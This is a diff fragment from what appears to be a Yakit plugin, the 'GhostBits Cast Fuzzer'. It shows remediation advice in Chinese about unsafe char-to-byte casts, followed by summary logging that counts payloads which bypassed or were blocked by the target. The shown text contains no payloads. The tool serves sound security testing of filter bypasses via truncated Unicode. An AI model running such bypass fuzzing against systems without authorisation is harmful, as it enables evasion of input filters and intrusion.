+3. 代码层面：排查自研代码中 (byte)ch、ch & 0xFF、baos.write(ch)、DataOutputStream#writeBytes()、StringUtils.uriDecode 等写法，改为明确指定编码的方式（如 String.getBytes(StandardCharsets.UTF_8)）。
+4. 输入验证：对文件名、邮件地址、URL 参数、JSON 键名等关键字段严格过滤非 ASCII 字符或进行 Unicode 归一化。
+            `),
+            risk.details(detail),
+        )
+    }
+}
+
+// 汇总输出
+yakit.Info("========== GhostBits Cast Fuzzer 检测完成 ==========")
+yakit.Info("目标: %v", target)
+yakit.Info("场景: %v", scenario)
+yakit.Info("Payload 总数: %v", len(payloads))
+if scenario == "generic_fuzz" {
+    yakit.Info("原始 Payload 被拦截: %v", rawAnalysis.isBlocked)
+}
+yakit.Info("GhostBits 绕过/成功: %v", bypassCount + successCount)
+yakit.Info("GhostBits 仍被拦截: %v", blockedCount)
+
+if hasFinding {
+    yakit.StatusCard("结论", sprintf("存在 Ghost Bits 攻击风险！(%d 个成功)", bypassCount + successCount))
+} else {
+    yakit.StatusCard("结论", "未检测到 Ghost Bits 攻击成功（或后端不存在该缺陷）。")
+}
